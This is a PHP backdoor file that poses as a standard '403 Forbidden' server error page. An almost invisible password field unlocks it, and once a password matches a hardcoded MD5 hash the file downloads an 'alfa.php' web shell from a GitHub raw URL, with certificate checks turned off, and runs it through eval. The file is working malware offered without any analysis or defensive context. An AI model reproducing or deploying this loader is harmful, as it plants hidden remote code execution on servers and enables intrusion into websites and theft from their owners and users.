<?php
session_start();
function is_logged_in() {
    return isset($_SESSION['R10TXER']);
}
function login($password) {
    $valid_password_hash = '6fec6b83b1fec8a924e7222124cf6e75';
    $password_hash = md5($password);
    if ($password_hash === $valid_password_hash) {
        $_SESSION['R10TXER'] = 'user';
        return true;
    } else {
        return false;
    }
}
function logout() {
    unset($_SESSION['R10TXER']);
}
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $password = $_POST['password'];
    if (login($password)) {
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error_message = "TITIT KAU";
        if (!is_logged_in()) {
            echo '<script>alert("'.$error_message.'");</script>';
        }
    }
}
function getContent($url) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($curl);
    curl_close($curl);
    if ($content === false) {
        $content = file_get_contents($url);
    }
    return $content;
}
?>
<?php
if (is_logged_in()) {
    $url = 'https://raw.githubusercontent.com/R10TX/getback/main/alfa.php';
    $content = getContent($url);
    eval('?>' . $content);
    exit;
}
?>

<!DOCTYPE html>
<html>
   <head>
      <title>403 Forbidden</title>
   </head>
   <body>
      <h1>Forbidden</h1>
      <p>You don't have permission to access <?php echo $_SERVER['REQUEST_URI']; ?> on this server.</p>
      <hr>
      <address><?php echo $_SERVER['SERVER_SOFTWARE']; ?> Server at <?php echo $_SERVER['SERVER_NAME']; ?> Port <?php echo $_SERVER['SERVER_PORT']; ?></address>
      <form method="post">
         <input style="position: absolute; bottom: 0; left: 50%; transform: translateX(-50%); background-color: #fff; border: 1px solid #fff; text-align: center;" type="password" name="password">
      </form>
   </body>
</html>
